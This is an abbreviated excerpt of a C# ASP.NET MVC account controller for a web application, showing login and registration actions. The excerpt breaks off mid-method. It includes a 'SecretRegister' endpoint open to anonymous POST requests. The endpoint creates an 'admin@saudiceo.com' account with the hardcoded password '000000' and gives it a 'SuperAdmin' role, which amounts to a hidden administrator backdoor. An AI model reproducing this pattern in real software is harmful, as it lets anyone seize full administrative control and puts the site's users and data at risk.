...
namespace Saudiceos.Enterprise.Web.Controllers
{
    ...
    public class AccountController : Controller
    {
        ...
        public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
        {
            ...
            var passwordMatched = UserManager.PasswordHasher.VerifyHashedPassword(user.PasswordHash, model.Password);
            switch (passwordMatched)
            {
        ...
        public async Task<ActionResult> Register(RegisterViewModel model)
        {
            if (ModelState.IsValid)
            {
                ...
                if (result.Succeeded)
                {
                    ...
                    //var idResult = _roleManager.Create(new IdentityRole("SuperAdmin")).Succeeded;
        ...
        [HttpPost]
        [AllowAnonymous] 
        public  void SecretRegister()
        {
            var user = new ApplicationUser()
            {
                UserName = "admin@saudiceo.com",
                PhoneNumber = "0100000000",
                Phone = "0100000000",
                Name = "Administrator",
                Email = "admin@saudiceo.com"
            };
            try
            {
                var result = UserManager.Create(user, "000000");
                if (result.Succeeded)
                {
                    RoleManager<IdentityRole> _roleManager = new RoleManager<IdentityRole>(
                    new RoleStore<IdentityRole>(new ApplicationDbContext()));
                    ...
                    if (!_roleManager.RoleExists("SuperAdmin"))
                    {
                        idResult = _roleManager.Create(new IdentityRole("SuperAdmin")).Succeeded;
                    }
                    else
                    {
                        idResult = true;
